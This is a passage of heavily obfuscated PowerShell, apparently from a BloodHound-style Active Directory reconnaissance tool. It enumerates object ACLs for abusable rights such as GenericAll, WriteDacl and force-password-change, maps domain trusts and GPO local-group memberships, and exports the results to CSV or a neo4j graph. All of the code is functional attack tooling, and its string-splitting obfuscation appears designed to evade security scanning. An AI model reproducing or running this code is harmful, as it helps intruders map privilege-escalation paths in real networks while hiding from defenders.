                ("{1}{0}" -f'1-4','S-')         = @(("{0}{1}{3}{2}" -f 'Non-u','niqu','thority','e Au'), ("{1}{0}" -f'ER','US'))
                ("{0}{1}"-f 'S-1','-5')         = @(("{2}{0}{1}" -f ' Autho','rity','NT'), ("{1}{0}"-f 'SER','U'))
                ("{0}{1}"-f 'S-1','-5-1')       = @(("{1}{0}{2}"-f 'ialu','D','p'), ("{1}{0}"-f 'ROUP','G'))
                ("{0}{1}"-f 'S-1-5-','2')       = @(("{0}{1}"-f 'Ne','twork'), ("{0}{1}"-f 'G','ROUP'))
                ("{1}{2}{0}" -f '3','S','-1-5-')       = @(("{0}{1}" -f 'Batc','h'), ("{1}{0}"-f'OUP','GR'))
                ("{0}{2}{1}"-f 'S-','4','1-5-')       = @(("{1}{2}{0}"-f've','Int','eracti'), ("{0}{1}" -f 'G','ROUP'))
                ("{2}{1}{0}" -f '5-6','1-','S-')       = @(("{1}{0}"-f 'ice','Serv'), ("{1}{0}" -f'P','GROU'))
                ("{1}{0}"-f '5-7','S-1-')       = @(("{1}{0}{2}"-f 'mou','Anony','s'), ("{1}{0}" -f 'ROUP','G'))
                ("{2}{0}{1}" -f '-','5-8','S-1')       = @(("{0}{1}" -f'P','roxy'), ("{0}{1}"-f 'GRO','UP'))
                ("{1}{0}" -f'-5-9','S-1')       = @(("{2}{5}{3}{0}{4}{6}{1}" -f'omain','s','Enterpri','e D',' ','s','Controller'), ("{1}{0}" -f'UP','GRO'))
                ("{1}{0}{2}"-f'-5-1','S-1','0')      = @(("{1}{4}{2}{3}{0}" -f 'f','Pri','l Se','l','ncipa'), ("{0}{1}"-f 'US','ER'))
                ("{0}{1}{2}" -f'S','-1','-5-11')      = @(("{0}{1}{3}{2}"-f 'A','uthen',' Users','ticated'), ("{1}{0}"-f 'OUP','GR'))
                ("{0}{2}{1}" -f 'S-1','12','-5-')      = @(("{3}{1}{0}{2}"-f 'tricted ','es','Code','R'), ("{0}{1}"-f 'G','ROUP'))
                ("{2}{0}{1}"-f'-1-5-1','3','S')      = @(("{3}{0}{2}{1}" -f'erminal Server ','rs','Use','T'), ("{1}{0}" -f'ROUP','G'))
                ("{0}{1}"-f 'S-1-5-','14')      = @(("{5}{7}{0}{6}{2}{4}{1}{3}"-f'In',' L','eractiv','ogon','e','R','t','emote '), ("{1}{0}" -f 'ROUP','G'))
                ("{0}{1}" -f'S-1-','5-15')      = @(("{0}{1}{3}{2}"-f 'This O','r',' ','ganization'), ("{1}{0}" -f'ROUP','G'))
                ("{1}{0}"-f '-5-17','S-1')      = @(("{5}{2}{4}{0}{1}{3}"-f'Organiz','ati','s','on ',' ','Thi'), ("{0}{1}"-f'GROU','P'))
                ("{0}{1}{2}" -f'S-','1-5','-18')      = @(("{3}{0}{2}{1}" -f 'Sy','m','ste','Local '), ("{0}{1}"-f'USE','R'))
                ("{0}{1}{2}"-f'S-1','-5-1','9')      = @(("{0}{2}{1}"-f 'NT','ority',' Auth'), ("{1}{0}" -f 'SER','U'))
                ("{0}{1}" -f'S-1-5','-20')      = @(("{2}{0}{1}"-f' A','uthority','NT'), ("{1}{0}"-f 'SER','U'))
                ("{1}{0}{2}"-f'5-8','S-1-','0-0')    = @(("{2}{1}{0}" -f'ervices ','ll S','A'), ("{1}{0}"-f 'P','GROU'))
                ("{1}{3}{2}{0}"-f'44','S-','5-32-5','1-')  = @(("{3}{4}{0}{2}{1}"-f 'm','strators','ini','A','d'), ("{0}{1}"-f'G','ROUP'))
                ("{0}{1}{2}" -f 'S-1','-5-3','2-545')  = @(("{1}{0}"-f's','User'), ("{0}{1}"-f'GROU','P'))
                ("{2}{3}{0}{1}"-f '32-54','6','S-1','-5-')  = @(("{0}{1}"-f 'Gues','ts'), ("{0}{1}"-f 'GRO','UP'))
                ("{1}{2}{0}{3}"-f '5','S-1-5-','32-','47')  = @(("{1}{2}{0}" -f ' Users','P','ower'), ("{1}{0}"-f'ROUP','G'))
                ("{1}{3}{0}{2}" -f '-32-','S','548','-1-5')  = @(("{3}{1}{0}{2}{4}"-f' Ope','t','ra','Accoun','tors'), ("{1}{0}"-f'UP','GRO'))
                ("{1}{2}{0}{3}"-f '4','S-1-5','-32-5','9')  = @(("{2}{0}{3}{1}{4}" -f'r','er Operator','Se','v','s'), ("{1}{0}"-f 'ROUP','G'))
                ("{1}{0}{2}"-f '-32-','S-1-5','550')  = @(("{3}{1}{2}{0}" -f'ators','rin','t Oper','P'), ("{0}{1}"-f 'GRO','UP'))
                ("{2}{1}{3}{0}"-f'32-551','-','S','1-5-')  = @(("{2}{3}{1}{4}{0}"-f's','t','Backup',' Opera','or'), ("{1}{0}"-f 'P','GROU'))
                ("{2}{0}{1}" -f '-','32-552','S-1-5')  = @(("{3}{2}{0}{1}" -f'o','rs','eplicat','R'), ("{1}{0}"-f'P','GROU'))
                ("{2}{0}{1}"-f'-5-32-5','54','S-1')  = @(("{4}{7}{6}{9}{5}{0}{8}{2}{3}{1}" -f '0 Compati','s','c','es','Pre-W','0','ndows','i','ble Ac',' 20'), ("{0}{1}"-f'GRO','UP'))
                ("{1}{2}{0}"-f '5','S-1-5-32-','55')  = @(("{0}{1}{5}{3}{4}{2}" -f'Remo','t','rs','s','ktop Use','e De'), ("{1}{0}"-f 'UP','GRO'))
                ("{2}{1}{0}{3}" -f'-5-32-','1','S-','556')  = @(("{2}{5}{6}{1}{0}{4}{3}{7}" -f'u','ig','Net','o','rati','wo','rk Conf','n Operators'), ("{1}{0}" -f 'UP','GRO'))
                ("{3}{2}{0}{1}"-f'-32-55','7','-5','S-1')  = @(("{2}{5}{0}{4}{3}{1}"-f're','t Builders','Incoming','rus','st T',' Fo'), ("{1}{0}"-f 'UP','GRO'))
                ("{0}{3}{2}{1}"-f'S-1-5-3','8','55','2-')  = @(("{6}{4}{1}{0}{3}{5}{2}{7}"-f'mance ','for','Us','M','r','onitor ','Pe','ers'), ("{0}{1}"-f 'G','ROUP'))
                ("{2}{0}{1}" -f '-32-','559','S-1-5')  = @(("{0}{3}{4}{2}{5}{1}"-f 'Performan','Users',' Lo','c','e','g '), ("{1}{0}" -f'P','GROU'))
                ("{1}{0}{2}{3}" -f '-','S-1','5-3','2-560')  = @(("{8}{9}{1}{6}{3}{10}{5}{7}{2}{0}{4}" -f 'r','w','on Access G','th','oup','z','s Au','ati','Wind','o','ori'), ("{0}{1}"-f 'GROU','P'))
                ("{1}{2}{3}{0}" -f'1','S-1','-5-3','2-56')  = @(("{7}{2}{0}{5}{6}{4}{3}{1}" -f'nal Serv','s','ermi','r','cense Serve','er L','i','T'), ("{0}{1}" -f'GR','OUP'))
                ("{1}{0}{2}"-f'5','S-1-5-32-','62')  = @(("{2}{3}{1}{0}"-f 'ers','M Us','Distribute','d CO'), ("{1}{0}" -f 'P','GROU'))
                ("{0}{2}{3}{1}" -f'S-1-','9','5-','32-56')  = @(("{2}{3}{0}{1}{4}" -f'raphic O','perator','Cryp','tog','s'), ("{1}{0}"-f'UP','GRO'))
                ("{2}{0}{1}"-f'-','32-573','S-1-5')  = @(("{3}{1}{0}{2}" -f'og Reade','ent L','rs','Ev'), ("{1}{0}"-f'ROUP','G'))
                ("{0}{1}{2}{3}"-f'S-1-5-32','-5','7','4')  = @(("{7}{4}{3}{0}{6}{1}{2}{5}" -f'D','M',' Acc',' Service ','cate','ess','CO','Certifi'), ("{0}{1}"-f'GRO','UP'))
                ("{2}{1}{0}{3}" -f '-5','1-5-32','S-','75')  = @(("{0}{5}{2}{4}{1}{3}" -f 'R','ver','Access Se','s','r','DS Remote '), ("{1}{0}" -f'ROUP','G'))
                ("{2}{0}{1}"-f'-1-5-32-5','76','S')  = @(("{0}{2}{1}{3}" -f'RDS','oint S',' Endp','ervers'), ("{0}{1}"-f 'GROU','P'))
                ("{2}{1}{0}" -f '7','2-57','S-1-5-3')  = @(("{2}{3}{1}{4}{0}"-f'rs','erv','RDS Manageme','nt S','e'), ("{0}{1}" -f'G','ROUP'))
                ("{0}{2}{1}"-f 'S-1-5-','78','32-5')  = @(("{3}{5}{0}{1}{2}{6}{4}"-f 'Adm','i','nist','Hype','ors','r-V ','rat'), ("{1}{0}"-f 'OUP','GR'))
                ("{2}{0}{1}"-f '1-','5-32-579','S-')  = @(("{8}{4}{10}{7}{3}{1}{5}{6}{2}{0}{9}" -f 'to','nc','ra','sista','ontrol','e O','pe','s','Access C','rs',' A'), ("{0}{1}"-f'GROU','P'))
                ("{1}{2}{0}"-f'-32-580','S-','1-5')  = @(("{7}{0}{5}{1}{2}{3}{6}{4}"-f's',' ','Assist','anc','s','s Control','e Operator','Acce'), ("{0}{1}" -f 'GRO','UP'))
            }

            ForEach (${TAr`GEt`dom`AIN} in ${t`ArgeTdom`AI`NS}) {
                
                &("{0}{1}{2}" -f'Write-','Verbos','e') ('Enumer'+'at'+'ing'+' '+'ACL'+'s '+'fo'+'r '+'object'+'s '+'in'+' '+'d'+'omai'+'n: '+"$TargetDomain")

                ${OBjec`TS`EaRC`h`er} = &("{0}{2}{4}{1}{3}" -f 'Get','ainSearche','-D','r','om') -Domain ${TarGETD`oma`iN} -DomainController ${DOMA`i`NcontR`OL`LER} -ADSPath ${uS`ERa`dsPA`Th}
                ${o`BJeCtSE`A`RC`HEr}."SeCURitYM`AS`KS" =   ( &('ls')  VariabLe:DqU0TF)."VaL`UE"::"dA`cL"

                
                
                
                
                ${objEcTs`eA`RCH`ER}."Fi`ltER" = ((("{27}{36}{22}{29}{16}{26}{41}{24}{5}{8}{23}{10}{34}{7}{6}{1}{3}{13}{35}{18}{40}{32}{25}{12}{9}{31}{17}{4}{37}{15}{2}{38}{0}{14}{30}{28}{20}{11}{39}{33}{21}{19}"-f'2','c','ype=5368709','ou','545',')(','Ac',')(sam','samAcco','e','tType','=5368','countTyp','ntT',')(s','(samAccountT','=8','843','=','))','pe','13','amA','un','06368','mAc','05','(Z','tTy','ccountType','amAccoun','=26','35456)(sa','09','=805306369','ype','f3(s','7)','1','7','2684','3')) -CrEPlaCe 'Zf3',[cHar]124)
                ${oBJE`Ct`SEArCh`eR}."pROpE`RTiE`STO`lo`AD".("{0}{1}"-f 'AddR','ange').Invoke((("{3}{1}{2}{0}{4}" -f'd','ist','inguishe','d','Name'),("{1}{3}{2}{0}" -f'ame','samac','ntn','cou'),("{0}{3}{1}{2}"-f'dn','stn','ame','sho'),("{2}{1}{0}"-f 'ass','bjectcl','o'),("{1}{2}{0}"-f 'id','objec','ts'),("{0}{1}" -f'nam','e'), ("{4}{3}{2}{0}{1}"-f 'to','r','itydescrip','r','ntsecu')))

                ${Obj`Ect`SE`ArcheR}.("{0}{1}{2}" -f'F','i','ndAll').Invoke() | &("{3}{1}{2}{0}" -f 'ct','a','ch-Obje','ForE') {
                    ${ob`je`Ct} = ${_}."P`Ro`pErTies"
                    if(${OBJ`ect} -and ${Ob`JE`cT}."dIst`inG`UIS`hedNaME" -and ${OB`je`ct}."d`I`s`TiNG`UISheDN`Ame"[0] -and ${o`B`JeCT}."OBjEct`Sid" -and ${ObjE`CT}."objecTs`ID"[0]) {

                        ${ObjeC`TS`id} = (&("{2}{0}{1}" -f'w-Objec','t','Ne') ("{7}{2}{6}{4}{0}{8}{1}{5}{3}" -f '.Se','tyI','t','ier','incipal','dentif','em.Security.Pr','Sys','curi')(${O`B`JEcT}."O`BjECt`sId"[0],0))."va`LUE"

                        try {
                            
                            &("{1}{0}{2}"-f'w-Objec','Ne','t') -TypeName ("{0}{4}{11}{3}{9}{10}{7}{8}{5}{2}{1}{6}"-f 'Sec','o','pt','l.RawS','urity.AccessCo','i','r','tyDes','cr','ecu','ri','ntro') -ArgumentList ${ObJ`E`Ct}[("{1}{3}{2}{0}{4}"-f't','ntsec','tydescrip','uri','or')][0], 0 | &("{1}{2}{0}"-f 't-Object','Sele','c') -Expand ("{0}{1}{2}" -f 'Discretion','ar','yAcl') | &("{0}{3}{1}{2}"-f'F','h-O','bject','orEac') {
                                ${cOu`NT`ER} += 1
                                if(${c`OU`NtER} % 10000 -eq 0) {
                                    &("{2}{0}{3}{1}" -f'ite-Ve','se','Wr','rbo') ('A'+'CE '+'co'+'u'+'nter: '+"$Counter")
                                    if(${A`C`LWri`TeR}) {
                                        ${a`cLwRit`eR}.("{1}{0}" -f 'ush','Fl').Invoke()
                                    }
                                     (&('gI') VArIaBle:qCF0z6 )."Val`UE"::("{0}{1}" -f 'Colle','ct').Invoke()
                                }

                                ${RAwacTi`V`EDirEcTor`YR`I`gH`Ts} = ( ( &('LS')  ("v"+"Ar"+"i"+"Able:R7"+"dW") )."v`ALUe"::"TOObjE`Ct"([System.DirectoryServices.ActiveDirectoryRights], ${_}."Ac`c`EsSmASK"))

                                
                                
                                
                                
                                
                                
                                
                                
                                if (
                                        ( (${raw`Act`Iv`ed`irEctOr`Yr`i`gHTs} -match ((("{1}{3}{2}{0}{4}"-f 'Ge','Gene','}','ricAll{0','nericWrite'))-F [cHAr]124)) -and (-not ${_}."Obj`EctAceT`Ype" -or ${_}."Obj`e`C`TACETyPE" -eq ("{4}{3}{0}{2}{5}{1}"-f'00-000','00','0-0000-0000-0','0','00000','000000000')) ) -or 
                                        (${RaWACtI`VeDir`e`CtORYr`i`Gh`TS} -match ((("{1}{2}{0}{3}"-f 'cl0wjW','W','riteDa','riteOwner')) -CREplaCe'0wj',[CHaR]124)) -or 
                                        ( (${RaWA`cTi`Ve`D`IrE`c`TORYr`iGHts} -match ("{0}{2}{3}{1}"-f 'Ext','t','ended','Righ')) -and (-not ${_}."oBJe`CTACet`ype" -or ${_}."O`BjeCTac`EtypE" -eq ("{3}{2}{1}{0}{4}{5}{6}"-f '000','-','00000-0000-0000-0000','000','0','000','00000')) ) -or 
                                        ((${_}."obje`cTacEty`Pe" -eq ("{4}{1}{3}{0}{5}{2}" -f 'd0-','70-246d-1','529','1','002995','a768-00aa006e0')) -and (${RAwA`CtIV`eDiR`EcTO`Ry`R`IghtS} -match ("{1}{2}{3}{0}"-f 'ight','Ext','ended','R'))) -or
                                        ((${_}."o`BJEc`TAceT`YPe" -eq ("{2}{4}{5}{1}{0}{3}" -f '4','030','bf9679c','9e2','0-0de6-11d0-a28','5-00aa0')) -and (${rawaC`TiV`ed`IrecTORyrIG`HtS} -match ("{0}{1}{2}"-f'WriteProper','t','y'))) -or
                                        ((${_}."OBjECt`A`Ce`TyPE" -eq ("{5}{6}{1}{7}{3}{9}{0}{4}{10}{8}{2}"-f'a','79a','2','-11d0-a285-','0030','bf','96','8-0de6','e','00a','49')) -and (${RA`wAcTivEdirEC`T`oRy`R`IGHts} -match ("{3}{1}{2}{4}{0}" -f'y','r','o','WriteP','pert')))
                                    ) {
                                    
                                    ${P`R`iN`ciPa`lsID} = ${_}."S`e`curitYiDe`NTIfI`er".("{1}{0}"-f 'oString','T').Invoke()
                                    ${pRinc`I`p`ALs`imPlenamE}, ${Pr`in`cIPaLOBje`CtCLAsS}, ${ACE`TY`Pe} = ${nu`Ll}

                                    
                                    
                                    ${A`Cti`VEdiRecTORyRIG`HTS} = ${ACLGenEr`ALRig`H`Tsre`G`ex}.("{2}{0}{1}"-f 'atch','es','M').Invoke(${RawA`CtIVeDi`REC`TO`Ryr`Ights}) | &("{0}{3}{1}{2}"-f 'S','-','Object','elect') -ExpandProperty ("{1}{0}"-f 'ue','Val')
                                    if (-not ${act`iVED`irE`CtoRyr`iGH`Ts}) {
                                        if (${R`A`W`ACTIVeDI`REcToRy`RIg`H`TS} -match ("{1}{3}{2}{0}"-f 't','Extended','h','Rig')) {
                                            ${AcT`Iv`edirECtoR`YRI`gH`Ts} = ("{2}{0}{1}"-f'Rig','ht','Extended')
                                        }
                                        else {
                                            ${aC`T`IV`ediREct`oR`yriG`HtS} = ("{2}{1}{3}{0}"-f'erty','it','Wr','eProp')
                                        }

                                        
                                        ${aCE`TY`pE} = Switch (${_}."obJEcTAc`Ety`Pe") {
                                            ("{5}{0}{6}{2}{3}{1}{4}" -f'299570-246','06e052','a','0','9','00','d-11d0-a768-00a') {("{0}{6}{1}{2}{4}{3}{5}{7}" -f 'User-','rce-Ch','an','Pa','ge-','sswo','Fo','rd')}
                                            ("{7}{2}{8}{4}{0}{6}{5}{9}{3}{1}" -f '11d0-a','9e2','79c0-0de','0304','-','5-','28','bf96','6','00aa0') {("{1}{0}"-f'mber','Me')}
                                            ("{3}{4}{6}{1}{5}{2}{0}" -f 'a285-00aa003049e2','de6','11d0-','b','f9679a','-','8-0') {("{2}{0}{1}{3}"-f'ript-P','a','Sc','th')}
                                            ("{0}{2}{1}" -f 'Def','t','aul') {'All'}
                                        }
                                    }

                                    if (${P`Ri`NcIPa`lMaPpI`NG}[${pRInc`ipA`LsID}]) {
                                        
                                        
                                        ${pRI`NC`i`P`A`lsimPlENAmE}, ${priNC`I`paloBj`ECtc`LA`ss} = ${prinC`IPa`lMap`PINg}[${pR`i`NCip`A`LSID}]
                                    }
                                    elseif (${cOM`monS`i`dm`AP`pinG}[${PrIn`Cip`AlSid}]) {
                                        
                                        ${P`RiNCI`P`AlName}, ${p`RInCipAlOBj`ECtCla`ss} = ${cOM`mon`sI`DmApp`INg}[${PR`InciPaL`sid}]
                                        ${PRin`CI`PalsiM`PlEn`Ame} = "$PrincipalName@$TargetDomain"
                                        ${pR`iNciPAL`map`pING}[${PR`I`N`cIP`AlSID}] = ${pr`i`NcIPAlSIMPle`N`A`ME}, ${Pr`I`NC`IPal`O`BJecT`CLaSS}
                                    }
                                    else {
                                        
                                        
                                        ${s`IDSEAR`cHER} = &("{1}{3}{0}{2}{4}"-f 'a','G','rch','et-DomainSe','er') -Domain ${T`ArGet`D`omAIN} -DomainController ${DOMaI`Ncon`TROlL`eR}
                                        ${sids`e`ARchEr}."proP`ErtI`E`sToLO`AD".("{2}{1}{0}"-f 'dRange','d','A').Invoke((("{3}{0}{2}{1}"-f 'acc','untname','o','sam'),("{2}{1}{3}{0}" -f'ame','sti','di','nguishedn'),("{3}{0}{2}{1}" -f's','ame','tn','dnsho'),("{2}{0}{3}{1}" -f'tcl','s','objec','as')))
                                        ${SI`dSearC`h`eR}."fil`TER" = "(objectsid=$PrincipalSid)"
                                        ${pr`iNCIP`A`LOB`JeCt} = ${Sids`eArch`ER}.("{1}{0}" -f 'e','FindOn').Invoke()

                                        if ((-not ${pR`iN`ci`PAl`ObjeCT}) -and ((-not ${dO`m`Ai`NcOn`Tr`olLeR}) -or (-not ${DomA`I`N`CON`TrO`llER}.("{3}{0}{2}{1}" -f'artsW','th','i','St').Invoke('GC:')))) {
                                            
                                            ${GCsE`A`RcHEr} = &("{2}{0}{3}{1}{4}"-f 'om','Sear','Get-D','ain','cher') -ADSpath ${gC`ADS`pa`TH}
                                            ${Gc`s`Ea`RChEr}."P`R`opERTiE`Sto`LOAD".("{0}{1}{2}" -f'A','d','dRange').Invoke((("{0}{2}{1}" -f 'sam','ame','accountn'),("{0}{4}{3}{2}{1}" -f'dist','e','m','nguishedna','i'),("{1}{2}{0}" -f'name','dnsho','st'),("{3}{0}{2}{1}" -f 'b','lass','jectc','o')))
                                            ${g`CSEa`RC`hER}."Filt`eR" = "(objectsid=$PrincipalSid)"
                                            ${p`Rinc`IpA`LOBje`cT} = ${G`CSeA`RcheR}.("{0}{2}{1}" -f 'F','ndOne','i').Invoke()
                                        }

                                        if (${pr`Incipa`lObJ`ect}) {
                                            if (${PRInci`PaloBJ`e`ct}."proPe`RT`ies"."oB`JEcT`clA`SS".("{1}{0}{2}" -f 'nt','co','ains').Invoke(("{0}{2}{1}"-f'c','r','ompute'))) {
                                                ${prIN`CIpALObj`ectCL`AsS} = ("{0}{1}{2}"-f 'CO','MPUTE','R')
                                                ${pr`i`NC`ipAL`SiMplE`NAME} = ${P`RIn`ciPA`lOb`je`Ct}."P`R`opeRTieS"."dn`shO`STnaMe"[0]
                                            }
                                            else {
                                                ${p`Ri`NCipalsAmaC`C`o`UN`TNA`me} = ${P`Ri`N`ci`PALObjECt}."Pro`Pe`Rt`Ies"."sAm`AcCO`UnTNAmE"[0]
                                                ${PRiN`CI`Pa`lDN} = ${prIncI`pA`LO`BJeCt}."P`Rop`ErTiEs"."DiSTiN`g`Uish`e`DNAMe"[0]
                                                ${P`RI`NciPAl`dOMAin} = ${PrI`NCi`PAl`dn}.("{2}{1}{0}"-f'g','trin','SubS').Invoke(${pr`i`NCIPa`ldN}.("{0}{2}{1}" -f'Ind','Of','ex').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                                ${P`RiNCi`P`AlsI`m`p`leNaMe} = "$PrincipalSamAccountName@$PrincipalDomain"

                                                if (${PriN`C`I`pAlo`BJEcT}."pR`oPERTI`eS"."oBj`e`cTCla`Ss".("{1}{2}{0}" -f 's','co','ntain').Invoke(("{1}{0}"-f 'p','grou'))) {
                                                    ${Pr`Inc`I`PA`LOBJe`ctc`lASS} = ("{1}{0}" -f 'ROUP','G')
                                                }
                                                elseif (${prI`NCIPAL`o`BJ`ECT}."Pro`perTi`eS"."ob`jE`c`TclAss".("{1}{2}{0}"-f'ins','co','nta').Invoke(("{1}{0}" -f 'er','us'))) {
                                                    ${pr`I`NC`iPalO`BjEc`TCLaSs} = ("{1}{0}" -f 'ER','US')
                                                }
                                                else {
                                                    ${p`RiNCIpA`L`OBJ`EctClaSs} = ("{1}{0}" -f 'HER','OT')
                                                }
                                            }
                                        }
                                        else {
                                            &("{1}{0}{2}"-f'rite-','W','Verbose') ('SI'+'D '+'not'+' '+'r'+'eso'+'lved: '+"$PrincipalSid")
                                        }

                                        ${P`RI`N`Ci`paLM`AppINg}[${Pr`incipA`ls`ID}] = ${P`R`i`NcipaLSImPLEnA`Me}, ${pR`i`NcI`palobj`E`ctCLASS}
                                    }

                                    if (${pRi`N`cIP`ALSimP`lE`NAmE} -and ${p`Ri`Ncip`ALoBJec`T`cL`Ass}) {
                                        ${oBj`E`cTNa`me}, ${o`BJec`TADtyPE} = ${N`UlL}

                                        if (${oB`je`Ct}."oBJectc`l`AsS".("{1}{0}" -f'ns','contai').Invoke(("{0}{1}" -f'c','omputer'))) {
                                            ${OBJe`cTAd`TY`PE} = ("{2}{1}{0}" -f'TER','U','COMP')
                                            if (${ObJe`cT}."d`NshOsT`N`AMe") {
                                                ${obj`Ec`TNamE} = ${ObJ`E`ct}."D`Ns`Ho`StNAme"[0]
                                            }
                                        }
                                        else {
                                            if(${Obje`cT}."Sa`Ma`Cc`OUNtN`Ame") {
                                                ${ob`jecTSam`Acc`O`UntnAMe} = ${o`BJe`ct}."S`AMACCO`UNTnAMe"[0]
                                            }
                                            else {
                                                ${oBJecTSa`Mac`c`OuNTn`AMe} = ${O`BjEcT}."Na`mE"[0]
                                            }
                                            ${d`N} = ${obJe`ct}."D`istI`NgUisHe`DN`A`Me"[0]
                                            ${OBJec`TDoMa`In} = ${Dn}.("{2}{1}{0}"-f'ng','tri','SubS').Invoke(${d`N}.("{0}{2}{1}" -f'Index','f','O').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                                            ${ObJ`Ect`Name} = "$ObjectSamAccountName@$ObjectDomain"

                                            if (${o`B`jecT}."oBjE`C`TclaSS".("{2}{0}{1}"-f't','ains','con').Invoke(("{0}{1}" -f 'g','roup'))) {
                                                ${O`BjECtADt`y`pe} = ("{1}{0}"-f'P','GROU')
                                            }
                                            elseif (${oBje`Ct}."O`BJE`Ct`Class".("{2}{1}{0}"-f 's','ain','cont').Invoke(("{1}{0}" -f'r','use'))) {
                                                ${ob`j`Ec`Ta`DTyPe} = ("{0}{1}" -f'US','ER')
                                            }
                                            else {
                                                ${OBjeCT`AdtY`pe} = ("{0}{1}"-f'O','THER')
                                            }
                                        }

                                        if (${ob`j`ECt`NAME} -and ${OBJEC`TADT`yPE}) {
                                            if (${PScM`DleT}.PARaMeTeRSEtnAme -eq ("{0}{2}{1}"-f 'CSVE','ort','xp')) {
                                                ${AC`lWr`I`TER}.("{1}{0}" -f'Line','Write').Invoke("`"$ObjectName`",`"$ObjectADType`",`"$PrincipalSimpleName`",`"$PrincipalObjectClass`",`"$ActiveDirectoryRights`",`"$ACEType`",`"$($_.AceQualifier)`",`"$($_.IsInherited)`"")
                                            }
                                            else {
                                                &("{0}{3}{1}{2}"-f'W','-Warn','ing','rite') ("{10}{14}{4}{3}{6}{0}{5}{1}{8}{2}{7}{11}{12}{9}{13}"-f'emen','neo4j','T','mp',': i','t ','l','ful',' RES','stion for ACLs','T',' API ','inge','!','ODO')
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch {
                            &("{2}{0}{3}{1}"-f'rite-Verb','e','W','os') ('AC'+'L '+'in'+'gesti'+'on'+' '+'er'+'ror:'+' '+"$_")
                        }
                    }
                }
            }
        }

        if(${uSe`DoM`A`IN`T`Rusts} -and ${t`A`RG`ETDOM`AInS}) {
            &("{1}{2}{4}{3}{0}" -f 'se','Wr','ite-','bo','Ver') ("{3}{1}{0}{4}{2}"-f 'd','apping ','sts','M','omain tru')
            &("{1}{3}{4}{2}{0}" -f'mainTrust','In','MapDo','v','oke-') | &("{1}{0}{4}{3}{2}" -f'or','F','ject','b','Each-O') {
                if(${_}."SourC`Ed`omaiN") {
                    ${SoUr`CEDom`AIn} = ${_}."SouR`cEdo`MaiN"
                }
                else {
                    ${sourcE`D`omAin} = ${_}."Sou`R`CE`NAme"
                }
                if(${_}."T`ARGET`D`OMAIn") {
                    ${tAr`Ge`Td`omaiN} = ${_}."TaR`G`ETdOm`Ain"
                }
                else {
                    ${taR`G`etd`O`mAiN} = ${_}."TArGeT`Na`Me"
                }

                if (${p`SC`mdleT}.ParamETERsetNamE -eq ("{1}{0}{2}"-f'or','CSVExp','t')) {
                    ${Tr`UsTWr`i`Ter}.("{2}{0}{1}"-f't','eLine','Wri').Invoke("`"$SourceDomain`",`"$TargetDomain`",`"$($_.TrustDirection)`",`"$($_.TrustType)`",`"$True`"")
                }
                else {
                    ${n`ULl} = ${StaTemE`N`Ts}.("{1}{0}" -f'dd','A').Invoke( @{ ("{1}{0}{2}"-f 'tate','s','ment')="MERGE (SourceDomain:Domain { name: UPPER('$SourceDomain') }) MERGE (TargetDomain:Domain { name: UPPER('$TargetDomain') })" } )

                    ${T`RUs`TtYPE} = ${_}."T`RuSt`TypE"
                    ${T`RaNSi`Ti`VE} = ${T`RUe}

                    Switch (${_}."truStd`IRE`CT`i`On") {
                        ("{0}{1}{2}" -f 'Inb','o','und') {
                             ${N`ULl} = ${s`TaTEMe`NTs}.("{1}{0}" -f 'd','Ad').Invoke( @{ ("{1}{2}{0}" -f 't','st','atemen')="MERGE (SourceDomain)-[:TrustedBy{ TrustType: UPPER('$TrustType'), Transitive: UPPER('$Transitive')}]->(TargetDomain)" } )
                        }
                        ("{1}{0}"-f'bound','Out') {
                             ${N`ULL} = ${S`TAtemEN`TS}.("{0}{1}" -f'Ad','d').Invoke( @{ ("{0}{1}{2}" -f 'state','men','t')="MERGE (TargetDomain)-[:TrustedBy{ TrustType: UPPER('$TrustType'), Transitive: UPPER('$Transitive')}]->(SourceDomain)" } )
                        }
                        ("{2}{0}{1}"-f 'directiona','l','Bi') {
                             ${n`ULl} = ${St`ATeMe`NTS}.("{1}{0}" -f 'd','Ad').Invoke( @{ ("{1}{2}{0}" -f 'tement','s','ta')="MERGE (TargetDomain)-[:TrustedBy{ TrustType: UPPER('$TrustType'), Transitive: UPPER('$Transitive')}]->(SourceDomain) MERGE (SourceDomain)-[:TrustedBy{ TrustType: UPPER('$TrustType'), Transitive: UPPER('$Transitive')}]->(TargetDomain)" } )
                        }
                    }

                }
            }
            if (${p`S`cMdL`eT}.pARAmETERsetnAME -eq ("{2}{1}{0}"-f 'API','ST','RE')) {
                ${J`SON} = @{ ("{0}{2}{1}" -f 'sta','ents','tem')=[System.Collections.Hashtable[]]${S`TA`Teme`NtS} }
                ${jS`Onr`EQ`UESt} = &("{3}{2}{1}{4}{0}" -f'o-Json20','ver','n','Co','tT') ${J`Son}
                ${Nu`lL} = ${W`EBcL`I`ENt}.("{0}{1}{2}{3}" -f 'Up','loadStr','in','g').Invoke(${u`RI}."ABSoLu`T`eurI" + ("{7}{2}{0}{1}{5}{6}{3}{4}" -f 'transac','tion','ta/','i','t','/com','m','db/da'), ${jSon`Req`UeSt})
                ${S`TaTem`eN`Ts}.("{1}{0}"-f 'lear','C').Invoke()
            }
            &("{1}{2}{3}{0}" -f 'se','Write-','Ver','bo') ("{1}{3}{5}{4}{2}{0}"-f 'trusts','D','ain ','one ','om','mapping d')
        }

        if(${U`seGpOgr`O`UP} -and ${tA`R`geTDOM`AiNs}) {
            ForEach (${Tar`geT`dOm`AIn} in ${TARG`e`TDomAI`Ns}) {

                &("{0}{2}{1}{3}"-f 'Wr','-Verbos','ite','e') ('E'+'numer'+'ati'+'ng '+'GPO'+' '+'l'+'o'+'cal '+'gro'+'up '+'membe'+'rships'+' '+'for'+' '+'d'+'oma'+'in '+"$TargetDomain")
                &("{0}{3}{2}{1}"-f'F','tion','a','ind-GPOLoc') -Domain ${tArGeT`d`OMain} -DomainController ${dOmai`N`c`o`NTROL`ler} | &("{1}{2}{0}{4}{3}"-f 'a','F','orE','bject','ch-O') {
                    ${aCco`U`NTNa`Me} = "$($_.ObjectName)@$($_.ObjectDomain)"
                    ForEach(${coMPu`T`Er} in ${_}."cOmPutEr`N`A`Me") {
                        if(${_}."isGro`Up") {
                            if (${P`sCM`DL`et}.ParameTerSeTnamE -eq ("{2}{0}{1}" -f 'VExpo','rt','CS')) {
                                ${L`Ocaladmin`wRi`Ter}.("{0}{3}{2}{1}"-f 'Wr','e','teLin','i').Invoke("`"$Computer`",`"$AccountName`",`"group`"")
                            }
                            else {
